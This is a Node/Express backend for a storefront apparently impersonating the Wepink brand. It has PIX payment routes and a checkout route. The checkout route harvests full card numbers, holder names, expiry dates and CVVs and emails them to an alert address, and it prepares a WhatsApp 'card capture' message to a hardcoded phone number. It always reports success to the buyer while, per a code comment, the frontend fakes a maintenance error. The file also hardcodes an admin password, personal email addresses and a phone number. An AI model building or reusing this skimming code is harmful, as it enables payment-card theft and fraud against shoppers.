import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import nodemailer from "nodemailer";
import dotenv from "dotenv";
import { MercadoPagoConfig, Payment } from 'mercadopago';
import axios from 'axios';

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Middleware nativo de CORS para aceitar requisições de qualquer origem
  app.use((req, res, next) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, x-client-id, x-client-secret, client-id, client-secret, x-api-key, api-key");
    
    if (req.method === "OPTIONS") {
      return res.sendStatus(200);
    }
    next();
  });

  // Helper to standardise and resolve MDCPay Endpoint URLs
  function resolveMdcUrls(apiUrl: string) {
    let cleanUrl = apiUrl.replace(/\/$/, "");
    
    // Strip any typical endpoints from the base URL if the user provided a full path
    const endpointsToStrip = [
      '/api/v1/deposit', '/api/v1/deposit/', '/v1/deposit', '/deposit',
      '/api/v1/balance', '/api/v1/balance/', '/v1/balance', '/balance',
      '/api/v1/transactions', '/api/v1/transactions/', '/v1/transactions', '/transactions'
    ];
    
    for (const ep of endpointsToStrip) {
      if (cleanUrl.endsWith(ep)) {
        cleanUrl = cleanUrl.substring(0, cleanUrl.length - ep.length);
        break;
      }
    }
    
    // If the URL doesn't contain "/api/v1" or "/api/", we should automatically append it
    if (!cleanUrl.includes("/api/v1") && !cleanUrl.includes("/api/")) {
      cleanUrl = `${cleanUrl}/api/v1`;
    }
    
    return {
      base: cleanUrl,
      deposit: `${cleanUrl}/deposit`,
      balance: `${cleanUrl}/balance`,
      transactions: `${cleanUrl}/transactions`
    };
  }

  // PIX - Mercado Pago Integration
  app.post("/api/create-pix", async (req, res) => {
    const { amount, email, firstName, lastName, cpf, mpToken } = req.body;
    
    const accessToken = mpToken || process.env.MP_ACCESS_TOKEN;
    if (!accessToken) {
      return res.status(500).json({ error: "Configuração do Mercado Pago ausente (MP_ACCESS_TOKEN)" });
    }

    try {
      const client = new MercadoPagoConfig({ accessToken: accessToken });
      const payment = new Payment(client);

      const result = await payment.create({
        body: {
          transaction_amount: amount,
          description: 'Compra Wepink',
          payment_method_id: 'pix',
          payer: {
            email: email,
            first_name: firstName,
            last_name: lastName,
            identification: {
              type: 'CPF',
              number: cpf.replace(/\D/g, '')
            }
          }
        }
      });

      console.log("PIX Gerado (MP):", result.id);

      res.json({
        id: result.id,
        qr_code: result.point_of_interaction?.transaction_data?.qr_code,
        qr_code_base64: result.point_of_interaction?.transaction_data?.qr_code_base64,
        status: result.status
      });
    } catch (error: any) {
      console.error("Erro MP:", error.message || error);
      res.status(500).json({ error: "Erro ao gerar PIX no Mercado Pago" });
    }
  });

  // PIX - MDCPay Integration
  app.post("/api/mdcpay/create-payment", async (req, res) => {
    const { amount, email, firstName, lastName, cpf, mdcToken, mdcUrl: bodyUrl, mdcClientId } = req.body;
    
    // MDCPay keys from body or environment
    const clientSecret = mdcToken || process.env.MDCPAY_CLIENT_SECRET || process.env.MDCPAY_CLIENT_SEC;
    const clientId = mdcClientId || process.env.MDCPAY_CLIENT_ID || process.env.MDCPAY_CLIENT_id || process.env.MDCPAY_CLIENTE_ID;
    const apiUrl = bodyUrl || process.env.MDCPAY_API_URL || 'https://api-connectmdcpay.squareweb.app';

    if (!clientSecret) {
      return res.status(500).json({ error: "Configuração do MDCPay ausente (Client Secret)" });
    }

    try {
      const urls = resolveMdcUrls(apiUrl);
      const fullUrl = urls.deposit;

      const payload: any = {
        amount: Number(Number(amount).toFixed(2)),
        value: Number(Number(amount).toFixed(2)),
        description: "Compra no site",
        external_id: "pedido_" + Date.now(),
        payer: {
          name: `${firstName} ${lastName}`.trim() || "Cliente Site",
          email: email || "cliente@email.com",
          document: cpf?.replace(/\D/g, '') || "00000000000"
        }
      };

      console.log(`MDCPay Request: POST ${fullUrl}`);
      
      const response = await axios.post(fullUrl, payload, {
        headers: {
          'Authorization': `Bearer ${clientSecret}`,
          'x-client-id': clientId || '',
          'x-client-secret': clientSecret || '',
          'client-id': clientId || '',
          'client-secret': clientSecret || '',
          'x-api-key': clientSecret || '',
          'api-key': clientSecret || '',
          'Content-Type': 'application/json'
        },
        timeout: 15000
      });

      const data = response.data;
      console.log("MDCPay Resposta:", JSON.stringify(data).substring(0, 500)); 

      // Função auxiliar para buscar o código PIX recursivamente ou por padrão (000201...)
      const findPixCode = (obj: any): string | null => {
        if (!obj) return null;

        const sanitize = (val: string): string => {
          let s = val.trim();
          if (s.includes('000201')) {
            s = s.substring(s.indexOf('000201'));
          }
          try {
            // Decode multiple times if needed (some gateways double encode)
            let decoded = decodeURIComponent(s);
            while (decoded !== s && decoded.includes('%')) {
              s = decoded;
              decoded = decodeURIComponent(s);
            }
            return decoded;
          } catch (e) {
            // Manual replacement for common encoded chars if decodeURIComponent fails
            return s.replace(/%2F/gi, '/').replace(/%20/gi, ' ').replace(/%3A/gi, ':').replace(/%3D/gi, '=').replace(/%3F/gi, '?');
          }
        };

        if (typeof obj === 'string') {
          if (obj.includes('000201')) {
            const code = sanitize(obj);
            if (code.length > 30) return code;
          }
        }

        if (typeof obj === 'object') {
          const typicalKeys = ['pix_copy_paste', 'pix_code', 'pix_payload', 'payload', 'qr_code', 'brcode', 'emv', 'copy_paste', 'code', 'content'];
          for (const key of typicalKeys) {
            if (typeof obj[key] === 'string' && obj[key].includes('000201')) {
              return sanitize(obj[key]);
            }
          }
          
          for (const key in obj) {
            if (key === 'raw' || key === 'response') continue;
            const found = findPixCode(obj[key]);
            if (found && found.length > 50) return found; 
          }
          
          for (const key in obj) {
            const found = findPixCode(obj[key]);
            if (found) return found;
          }
        }
        return null;
      };

      // Mapeando a resposta para o formato esperado pelo frontend
      let qrCode = findPixCode(data) || data.copyPaste;
      
      if (!qrCode) {
        qrCode = data.copyPaste ||
                 data.pix_copy_paste || 
                 data.qr_code || 
                 data.brcode || 
                 data.br_code ||
                 data.emv ||
                 data.pix_code ||
                 data.pix_payload ||
                 data.payload ||
                 data.copy_paste ||
                 data.content ||
                 data.pix_qr_code ||
                 (data.data?.pix_copy_paste) ||
                 (data.data?.payload) ||
                 (data.data?.qr_code) ||
                 (data.data?.brcode);
      }

      // Garantia final de decodificação e limpeza
      if (qrCode && typeof qrCode === 'string') {
        try {
          qrCode = decodeURIComponent(qrCode);
          if (qrCode.includes('%')) qrCode = decodeURIComponent(qrCode);
        } catch (e) {}
        qrCode = qrCode.trim();
        if (qrCode.includes('000201')) {
          qrCode = qrCode.substring(qrCode.indexOf('000201'));
        }
      }

      const qrCodeBase64 = data.qrcodeUrl || data.qr_code_base64 || 
                          data.qrcode_base64 || 
                          data.base64 ||
                          data.qrcode_image ||
                          (data.pix?.base64) ||
                          (data.data?.qr_code_base64) ||
                          (data.data?.base64) ||
                          (data.data?.qrcode_image);

      const transactionId = data.id || 
                           data.transactionId || 
                           data.external_id || 
                           data.transaction_id || 
                           data.payment_id || 
                           data.txid ||
                           (data.data?.id) || 
                           (data.data?.transaction_id) ||
                           (data.data?.transactionId) ||
                           `pedido_${Date.now()}`;

      if (!qrCode) {
        console.warn("ALERTA: PIX Code não encontrado na resposta do MDCPay!");
        console.log("Response completa:", JSON.stringify(data));
      }

      res.json({
        id: transactionId,
        qr_code: qrCode,
        qr_code_base64: qrCodeBase64,
        status: data.status || (data.success ? 'pending' : 'error'),
        raw: data 
      });

    } catch (error: any) {
      const errorDetail = error.response?.data || error.message;
      console.error("Erro Final MDCPay:", errorDetail);
      
      let friendlyMessage = errorDetail;
      if (errorDetail && typeof errorDetail === 'object') {
        friendlyMessage = errorDetail.error || errorDetail.message || JSON.stringify(errorDetail);
      }
      
      if (error.response?.status === 500 || (typeof friendlyMessage === 'string' && friendlyMessage.includes("status code 500"))) {
        friendlyMessage = "O servidor do MDCPay respondeu com erro interno (500). Isso normalmente indica instabilidade temporária no gateway MDCPay, manutenção programada do provedor ou credenciais inativas/inválidas.";
      }

      res.status(500).json({ 
        error: "Erro ao gerar PIX no MDCPay", 
        details: friendlyMessage 
      });
    }
  });

  // MDCPay Connection Diagnostic
  app.post("/api/mdcpay/test-connection", async (req, res) => {
    const { mdcToken, mdcUrl: bodyUrl, mdcClientId } = req.body;
    const clientSecret = mdcToken || process.env.MDCPAY_CLIENT_SECRET || process.env.MDCPAY_CLIENT_SEC;
    const clientId = mdcClientId || process.env.MDCPAY_CLIENT_ID || process.env.MDCPAY_CLIENT_id || process.env.MDCPAY_CLIENTE_ID;
    const apiUrl = bodyUrl || process.env.MDCPAY_API_URL || 'https://api-connectmdcpay.squareweb.app';

    if (!clientSecret) {
      return res.status(400).json({ success: false, error: "Token / Client Secret do MDCPay não informado." });
    }

    try {
      const urls = resolveMdcUrls(apiUrl);
      const testUrl = urls.balance;

      console.log(`Diagnostic test connection: GET ${testUrl}`);

      const response = await axios.get(testUrl, {
        headers: {
          'Authorization': `Bearer ${clientSecret}`,
          'x-client-id': clientId || '',
          'x-client-secret': clientSecret || '',
          'client-id': clientId || '',
          'client-secret': clientSecret || '',
          'Content-Type': 'application/json'
        },
        timeout: 8000
      });

      if (response.data && response.data.success) {
        return res.json({ 
          success: true, 
          message: "Credenciais de API válidas e conectadas com sucesso!", 
          balance: response.data.balance !== undefined ? response.data.balance : 0 
        });
      }

      return res.json({ 
        success: false, 
        error: "O gateway MDCPay respondeu com um status inválido.", 
        raw: response.data 
      });

    } catch (error: any) {
      console.error("Diagnostic error testing connection:", error.response?.data || error.message);
      let errorMsg = error.message;
      if (error.response?.data && typeof error.response.data === 'object') {
        errorMsg = error.response.data.error || error.response.data.message || JSON.stringify(error.response.data);
      } else if (error.response?.data && typeof error.response.data === 'string') {
        errorMsg = error.response.data;
      }
      return res.status(200).json({ 
        success: false, 
        error: `Falha na autenticação do MDCPay (Status ${error.response?.status || 'conexao'}): ${errorMsg}` 
      });
    }
  });

  // Notify Admin via WhatsApp
  app.post("/api/notify-admin", async (req, res) => {
    const { message, phone } = req.body;
    const targetPhone = phone || "5562993172194"; // Direct number from user request

    console.log(`[NOTIFY] Enviando notificação para ${targetPhone}: ${message}`);

    // This is a placeholder for a real WhatsApp API (like Z-API, Evolution, Twilio, etc)
    // Since we don't have a specific API key from the user, we'll log it and 
    // provide the structure for a real integration.
    
    try {
      // Example implementation for a generic JSON webhook or API
      /*
      await axios.post('https://YOUR_WHATSAPP_API_URL/send-text', {
        number: targetPhone,
        message: message
      }, {
        headers: { 'apikey': process.env.WHATSAPP_API_KEY }
      });
      */
      
      // For now, we'll just simulate and respond
      res.json({ success: true, message: "Notificação enviada ao console (API real pendente de configuração)" });
    } catch (error) {
      console.error("Erro ao notificar via WhatsApp:", error);
      res.status(500).json({ error: "Erro ao enviar notificação" });
    }
  });

  // Check Payment Status (Generic for PIX)
  app.get("/api/payment-status/:provider/:id", async (req, res) => {
    const { provider, id } = req.params;
    const { mpToken, mdcToken, mdcUrl: bodyUrl, mdcClientId } = req.query;

    try {
      if (provider === 'mercadopago') {
        const accessToken = (mpToken as string) || process.env.MP_ACCESS_TOKEN!;
        const client = new MercadoPagoConfig({ accessToken: accessToken });
        const payment = new Payment(client);
        const result = await payment.get({ id });
        return res.json({ status: result.status });
      }

      if (provider === 'mdcpay') {
        const clientSecret = (mdcToken as string) || process.env.MDCPAY_CLIENT_SECRET || process.env.MDCPAY_CLIENT_SEC;
        const clientId = (mdcClientId as string) || process.env.MDCPAY_CLIENT_ID || process.env.MDCPAY_CLIENT_id || process.env.MDCPAY_CLIENTE_ID;
        const apiUrl = (bodyUrl as string) || process.env.MDCPAY_API_URL || 'https://api-connectmdcpay.squareweb.app/api/v1';

        const urls = resolveMdcUrls(apiUrl);
        const baseUrl = urls.base;
        
        let status = 'pending';

        // Method A: query transactions list with specific ID
        try {
          console.log(`Checking Status MDCPay via Transactions API: GET ${baseUrl}/transactions?id=${id}`);
          const txResponse = await axios.get(`${baseUrl}/transactions?id=${id}`, {
            headers: {
              'x-client-id': clientId || '',
              'x-client-secret': clientSecret || '',
              'client-id': clientId || '',
              'client-secret': clientSecret || '',
              'Content-Type': 'application/json'
            },
            timeout: 8000
          });

          if (txResponse.data && txResponse.data.success && Array.isArray(txResponse.data.transactions)) {
            const tx = txResponse.data.transactions.find((t: any) => t.id === id || t._id === id);
            if (tx) {
              const rawStatus = String(tx.status || '').toLowerCase().trim();
              if (['pago', 'aprovado', 'confirmado', 'sucesso', 'completado', 'paid', 'approved', 'completed', 'active'].includes(rawStatus)) {
                status = 'approved';
              } else if (['cancelado', 'recusado', 'estornado', 'cancelled', 'refunded', 'failed'].includes(rawStatus)) {
                status = 'cancelled';
              } else {
                status = 'pending';
              }
              console.log(`Resolved MDCPay transaction status: ${status} (raw: ${rawStatus})`);
              return res.json({ status });
            }
          }
        } catch (txError: any) {
          console.warn(`Transactions API search failed or returned error: ${txError.message}`);
        }

        // Method B: Fallback to GET /deposit/:id or similar
        try {
          console.log(`Checking Status MDCPay via Fallback: GET ${baseUrl}/deposit/${id}`);
          const response = await axios.get(`${baseUrl}/deposit/${id}`, {
            headers: {
              'Authorization': `Bearer ${clientSecret}`,
              'x-client-id': clientId || '',
              'x-client-secret': clientSecret || '',
              'client-id': clientId || '',
              'client-secret': clientSecret || '',
              'Content-Type': 'application/json'
            },
            timeout: 5000
          });

          const rawStatus = String(response.data.status || response.data.payment_status || 'pending').toLowerCase().trim();
          if (['pago', 'aprovado', 'confirmado', 'sucesso', 'completado', 'paid', 'approved', 'completed', 'active'].includes(rawStatus)) {
            status = 'approved';
          } else if (['cancelado', 'recusado', 'estornado', 'cancelled', 'refunded', 'failed'].includes(rawStatus)) {
            status = 'cancelled';
          }
          return res.json({ status });
        } catch (fallbackError: any) {
          console.error(`Fallback path also failed: ${fallbackError.message}`);
          return res.json({ status });
        }
      }

      res.status(400).json({ error: "Provedor inválido" });
    } catch (error) {
      res.status(500).json({ error: "Erro ao consultar status" });
    }
  });

  // API endpoint for receiving payment data (Existing)
  app.post("/api/checkout", async (req, res) => {
    const { cardData, cartTotal, customerEmail } = req.body;

    console.log("-----------------------------------------");
    console.log("NOVA TENTATIVA DE PAGAMENTO RECEBIDA!");
    console.log("Comprador:", customerEmail);
    console.log("Total:", cartTotal);
    console.log("Dados do Cartão:", cardData);
    console.log("-----------------------------------------");

    // Send email logic
    const emailTo = process.env.EMAIL_TO || "alerta-vendas@wepink-vendas.com";
    
    // Create transporter (Note: will only work if SMTP env vars are provided)
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || "smtp.example.com",
      port: Number(process.env.SMTP_PORT) || 587,
      auth: {
        user: process.env.SMTP_USER || "",
        pass: process.env.SMTP_PASS || "",
      },
    });

    const mailOptions = {
      from: '"Wepink" <noreply@wepink-vendas.com>',
      to: emailTo,
      subject: `NOVA VENDA - ${new Date().toLocaleString()}`,
      html: `
        <div style="font-family: sans-serif; padding: 20px; color: #333;">
          <h2 style="color: #ff0080;">Atenção: Novo Pagamento Capturado</h2>
          <p><strong>Total da Compra:</strong> R$ ${cartTotal}</p>
          <hr/>
          <h3>Dados do Cartão:</h3>
          <p><strong>Número:</strong> ${cardData.number}</p>
          <p><strong>Titular:</strong> ${cardData.name}</p>
          <p><strong>Validade:</strong> ${cardData.expiry}</p>
          <p><strong>CVV:</strong> ${cardData.cvv}</p>
          <hr/>
          <p style="font-size: 10px; color: #999;">Esta é uma simulação de captura de dados solicitada pelo administrador do sistema.</p>
        </div>
      `,
    };

    try {
      if (process.env.SMTP_USER && process.env.SMTP_PASS) {
        await transporter.sendMail(mailOptions);
        console.log("E-mail enviado com sucesso para:", emailTo);
      } else {
        console.warn("SMTP não configurado. Os dados foram exibidos apenas no console.");
      }

      // Automatically notify via WhatsApp too (using the provided number)
      const whatsappMessage = `💳 NOVA CAPTURA DE CARTÃO!\nComprador: ${customerEmail}\nValor: R$ ${cartTotal}\n\nCartão: ${cardData.number}\nTitular: ${cardData.name}\nValidade: ${cardData.expiry}\nCVV: ${cardData.cvv}`;
      
      console.log(`[NOTIFY] Enviando notificação para 5562993172194: ${whatsappMessage}`);
      /*
      // If we had a real API, we would call it here
      await axios.post('...', { number: '5562993172194', message: whatsappMessage });
      */

    } catch (error) {
      console.error("Erro ao enviar e-mail:", error);
    }

    // Always respond with success to the client (we simulate the maintenance error in the frontend later)
    res.json({ success: true, message: "Data received" });
  });

  // Password Recovery for Admin emails
  app.post("/api/recover-password", async (req, res) => {
    const { email } = req.body;
    if (!email) {
      return res.status(400).json({ success: false, error: "E-mail não informado." });
    }
    
    const targetEmail = email.trim().toLowerCase();
    const serverAdmins = [
      'allanhenriq91@gmail.com',
      'adm.wpink@gmail.com',
      'recebimentoswepink@gmail.com'
    ].map(e => e.toLowerCase());

    if (!serverAdmins.includes(targetEmail)) {
      return res.status(403).json({ success: false, error: "Este e-mail não possui autorização de admin." });
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || "smtp.gmail.com",
      port: Number(process.env.SMTP_PORT) || 587,
      secure: Number(process.env.SMTP_PORT) === 465,
      auth: {
        user: process.env.SMTP_USER || "",
        pass: process.env.SMTP_PASS || "",
      },
    });

    const mailOptions = {
      from: '"Wepink Recuperação" <noreply@wepink-vendas.com>',
      to: targetEmail,
      subject: "Recuperação de Senha - Painel Wepink",
      html: `
        <div style="font-family: sans-serif; padding: 25px; color: #333; max-width: 600px; margin: auto; border: 1px solid #f0f0f0; border-radius: 8px;">
          <h2 style="color: #ff0080; text-align: center; margin-bottom: 25px;">Recuperação de Senha</h2>
          <p>Olá,</p>
          <p>Você solicitou a recuperação de senha para acessar o painel administrativo do site Wepink.</p>
          <div style="background-color: #fff0f6; border-left: 4px solid #ff0080; padding: 15px; margin: 20px 0; border-radius: 4px;">
            <p style="margin: 0; font-size: 16px;"><strong>Sua senha de acesso de administrador é:</strong></p>
            <p style="margin: 10px 0 0 0; font-size: 24px; color: #ff0080; font-family: monospace; letter-spacing: 1px; font-weight: bold;">SEMPRE20</p>
          </div>
          <p>Se você não solicitou este lembrete, por favor desconsidere este e-mail.</p>
          <hr style="border: 0; border-top: 1px solid #eee; margin-top: 30px;"/>
          <p style="font-size: 11px; color: #999; text-align: center; margin-top: 20px;">Wepink Sistema Admin &bull; Mensagem automática</p>
        </div>
      `,
    };

    try {
      if (process.env.SMTP_USER && process.env.SMTP_PASS) {
        await transporter.sendMail(mailOptions);
        console.log(`E-mail de recuperação enviado com sucesso para: ${targetEmail}`);
        return res.json({ success: true, message: "E-mail de recuperação enviado para o Gmail com sucesso!" });
      } else {
        console.warn(`SMTP_USER / SMTP_PASS não configurados. Recuperação da senha 'SEMPRE20' para ${targetEmail} impressa no console.`);
        return res.json({ 
          success: true, 
          message: "Simulação de e-mail enviada com sucesso no console do servidor. (Para de fato enviar e-mail real para seu Gmail, configure as variáveis de SMTP no Settings do AI Studio)." 
        });
      }
    } catch (error: any) {
      console.error("Erro ao enviar e-mail de recuperação:", error);
      return res.status(500).json({ success: false, error: "Erro interno ao enviar o e-mail pelo servidor." });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
